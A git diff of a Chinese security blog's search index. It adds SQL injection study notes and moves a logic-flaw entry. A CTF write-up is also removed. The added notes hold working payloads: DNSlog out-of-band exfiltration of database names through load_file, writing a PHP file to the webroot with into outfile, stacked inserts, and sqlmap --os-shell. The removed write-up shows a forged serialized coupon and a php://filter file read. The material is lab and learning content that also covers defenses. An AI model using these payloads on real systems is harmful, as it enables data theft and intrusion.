+2.5 DNSlog 盲注2.5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
+2.5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
+
+
+secure_file_priv&#x3D;null 不允许导入导出
+secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
+secure_file_priv&#x3D; 无限制
+
+2.5.3 有权限直接读取
+读取路径：
+
+?id=-1 union select 1,2,3,@@datadir
+
+
+读取文件：
+
+?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
+
+示例：（\ 转义）
+?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
+
+
+写入文件：
+
+?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
+
+示例：
+?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
+
+2.5.4 采用 DNSlog 带外获取http://dnslog.cn/  
+
+
+实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn  
+
+
+
+查当前库名
+
+?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
+
+注入后，点击网站的 Refresh Record 就会返回数据库名。
+
+查表名
+
+// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
+
+2.6 二次注入2.6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
+2.6.2 实战
+碰撞用户，确认用户名 admin 存在
+注册用户名：admin&#39;#
+修改密码时执行SQL：
+
+update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
+
+admin&#39;#的密码没变，修改的是admin的密码
+2.7 堆叠注入2.7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
+2.7.2 实战
+获取库名、表名、字段名、数据等信息
+构造攻击语句：
+
+?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
+
+
+3. SQLMap工具运用
+官⽹：https://sqlmap.org/
+作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
+
+3.1 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
+
+3.2 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
+
+
+4. SQL注入绕过4.1 提交方式更改GET 改 POST
+安全狗（WAF 防御）
+4.2 特殊字符绕过database/**/()
+
+4.3 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
+
+4.4 数据库特性绕过/*!44509select*/
+
+
+5. SQL注入防护
+过滤：限制长度、识别恶意关键字
+转义：用户输入当文本
+数据库权限控制、敏感数据加密
+预编译（参数化查询）
+
+
+6. 总结
+报错注入是在 union 注入在查询不到的情况下，才使用
+在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
+
+
+本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含漏洞</title>
     <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
     <content><![CDATA[一、漏洞检测与危害1.概念
@@ -1505,362 +1644,6 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>御网杯Web部分题解</title>
-    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
-    <content><![CDATA[一、WEB-Snake_Game1. 题目
-
-
-
-2. 解题思路
-题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
-F12
-
-
-
-
-添加覆盖脚本
-
-
-
-修改成功！
-
-
-
-拿到 flag
-
-
-
-
-二、WEB-PHP_Payment1. 题目
-
-2. 解题思路
-根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
-
-
-
-
-下载附件，收集信息
-
-
-
-代码审计 apply_coupon.php
-1、包含了另外两个文件
-
-
-2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
-
-
-如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
-再看models.php 里的类
-
-
-有两个属性，一是代金券金额，一是代金券码。
-含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
-所以，目标就是，构造一个金额够买 Flag
-3、 构造 代金券
-&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
-
-
-
-TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
-
-
-
-
-
-购买 Flag，看 buy.php
-
-
-
-
-
-
-
-用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
-
-
-依据这个 调用 fetch
-fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
-
-拿到 flag
-
-
-
-
-
-三、WEB-Enterprise_OA1. 题目
-
-
-
-2. 解题思路
-根据题目提示，这题考查目录穿越、文件包含
-先尝试访问 flag.php
-
-
-
-include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
-路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
-并且服务器是：
-
-
-说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
-
-读源代码
-
-
-
-用 php 伪协议
-php://filter/read=convert.base64-encode/resource=index.php
-
-
-
-利用 base64 在线解密工具
-PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
-
-
-
-
-访问绝对路径
-
-
-
-
-访问 flag 文件
-
-比如：flag.php   flag.txt
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞</title>
-    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
-简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
-2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
-二、逻辑漏洞与常见漏洞类型的区别1、漏洞性质
-逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
-其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
-
-2、攻击方式和目标
-逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
-其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
-
-3、检测方法
-逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
-其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
-
-三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
-1、越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
-2、业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
-3、流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
-四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
-(2)绕过身份认证有以下几种方法:
-暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
-
-(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
-爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
-
-修复方法:
-增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
-
-基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
-2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
-未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
-越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
-越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
-(1) 越权漏洞分类
-水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
-垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
-
-越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
-(2) pikachu 靶场
-2.1 水平越权案例
-使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-修改请求参数，访问其他用户信息：
-http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-
-2.2 垂直越权案例
-使用普通用户pikachu/000000登录，页面仅开放查看权限。
-
-直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
-
-
-创建之后，再次查看。
-
-漏洞原因：代码仅校验登录状态，未校验用户权限级别
-$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
-
-3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
-
-业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
-业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
-
-(1) 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
-修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
-(2) 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
-(3) 大米CMS支付漏洞3.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
-3.2 修改支付状态
-字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
-数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
-
-3.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
-4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
-漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
-案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
-[id:1,&#x27;password&#x27;admin12345&quot;)
-
-五、逻辑漏洞总结1、经典业务逻辑漏洞案例
-美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
-网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
-
-2、历史公开漏洞（1）支付逻辑漏洞
-客户端直接篡改支付金额
-订单数量无负数限制，实现0元购、负数金额订单
-请求重放、参数篡改实现余额倍增、免费下单
-团购、充值类订单参数可篡改
-
-（2）密码找回&#x2F;修改逻辑漏洞
-暴力破解用户凭证
-找回链接、页面泄露用户信息
-验证码、Token设计缺陷，可通用&#x2F;预测
-越权修改任意账号密码
-找回流程、验证步骤可绕过
-
-（3）应用程序逻辑错误
-绕过交易限制、刷取账户余额
-Cookie&#x2F;Session设计缺陷导致任意账号登录
-强制浏览、流程顺序缺陷，遍历数据
-时间校验缺陷（如12306刷票）
-
-（4）越权分类
-新增数据越权
-删除数据越权（如删除他人素材）
-修改数据越权（篡改用户信息）
-查询数据越权（批量泄露信息）
-URL&#x2F;参数越权
-
-（5）验证码安全问题
-客户端实现、可直接绕过&#x2F;爆破
-服务端验证码可重复使用、可预测
-万能验证码、验证码在请求包明文展示
-验证码强度低，可被OCR识别
-无次数、时效限制，可无限爆破
-
-（6）JS敏感信息泄露
-JS文件泄露后台路径、接口API
-前端JS窃取受保护Cookie
-AJAX、前端脚本泄露手机号、邮箱等隐私
-
-3、逻辑漏洞分类梳理（1）交易类
-修改支付价格
-修改支付状态
-修改&#x2F;负数化购买数量
-篡改金额为负数
-请求重放攻击
-数据库并发锁处理不当
-
-（2）业务风控类
-刷取优惠券、重复享受优惠
-套现类漏洞
-
-（3）账号注册类
-重复注册、账号覆盖
-用户名遍历猜解
-
-（4）密码相关
-密码明文存储、未做哈希加密
-无密码强度校验
-
-（5）账号信息类
-用户名&#x2F;邮箱前后空格、大小写处理不当
-手机号格式校验缺陷（如+86前缀绕过）
-
-（6）Cookie&#x2F;Session类
-Cookie存储敏感数据
-Cookie&#x2F;Session可伪造、无合法性校验
-
-（7）登录类
-撞库攻击
-账号劫持
-恶意锁号（无解锁机制）
-传输信道不安全
-凭证本地不安全存储
-
-（8）密码找回类
-越权重置任意密码
-新密码在响应包明文返回
-Token前端可控、无服务端强校验
-头部字段处理不当引发漏洞
-找回流程泄露敏感信息
-
-（9）修改密码类
-越权修改他人密码
-无需验证旧密码即可改密
-
-（10）申诉类
-身份伪造
-申诉流程绕过
-
-（11）信息查询&#x2F;更新类
-越权查询、修改数据
-ID可枚举，批量遍历用户数据
-
-（12）双因素认证(2FA)漏洞
-改密&#x2F;登录后自动跳过二次验证
-OAuth登录未开启2FA
-2FA验证码可爆破、存在竞争条件
-返回值篡改绕过
-链接、功能可绕过2FA
-CSRF攻击禁用2FA
-
-（13）验证码漏洞汇总
-可重用、可预测、无时效&#x2F;次数限制
-客户端生成&#x2F;校验、前端直接绕过
-数据包明文展示验证码
-强度低可被机器识别
-特殊参数绕过、可用于短信&#x2F;邮件轰炸
-
-（14）Session漏洞
-Session可猜测、伪造、泄露
-Session固定攻击
-
-（15）越权细分
-未授权访问
-水平越权（同权限用户互访）
-垂直越权（低权限访问高权限）
-交叉越权
-
-（16）其他漏洞
-ID、随机数生成规则简单，可枚举&#x2F;预测
-接口无访问次数、权限限制
-加密算法误用
-业务执行顺序缺陷
-各类敏感信息泄露
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>逻辑漏洞</category>
-      </categories>
-      <tags>
-        <tag>逻辑漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2922,6 +2705,223 @@ deny_arr：黑名单
       </categories>
       <tags>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞</title>
+    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
+简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
+2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
+二、逻辑漏洞与常见漏洞类型的区别1、漏洞性质
+逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
+其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
+
+2、攻击方式和目标
+逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
+其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
+
+3、检测方法
+逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
+其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
+
+三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
+1、越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
+2、业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
+3、流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
+四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
+(2)绕过身份认证有以下几种方法:
+暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
+
+(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
+爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
+
+修复方法:
+增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
+
+基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
+2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
+未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
+越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
+越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
+(1) 越权漏洞分类
+水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
+垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
+
+越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
+(2) pikachu 靶场
+2.1 水平越权案例
+使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+修改请求参数，访问其他用户信息：
+http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+
+2.2 垂直越权案例
+使用普通用户pikachu/000000登录，页面仅开放查看权限。
+
+直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
+
+
+创建之后，再次查看。
+
+漏洞原因：代码仅校验登录状态，未校验用户权限级别
+$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
+
+3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
+
+业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
+业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
+
+(1) 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
+修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
+(2) 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
+(3) 大米CMS支付漏洞3.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
+3.2 修改支付状态
+字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
+数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
+
+3.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
+4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
+漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
+案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
+[id:1,&#x27;password&#x27;admin12345&quot;)
+
+五、逻辑漏洞总结1、经典业务逻辑漏洞案例
+美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
+网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
+
+2、历史公开漏洞（1）支付逻辑漏洞
+客户端直接篡改支付金额
+订单数量无负数限制，实现0元购、负数金额订单
+请求重放、参数篡改实现余额倍增、免费下单
+团购、充值类订单参数可篡改
+
+（2）密码找回&#x2F;修改逻辑漏洞
+暴力破解用户凭证
+找回链接、页面泄露用户信息
+验证码、Token设计缺陷，可通用&#x2F;预测
+越权修改任意账号密码
+找回流程、验证步骤可绕过
+
+（3）应用程序逻辑错误
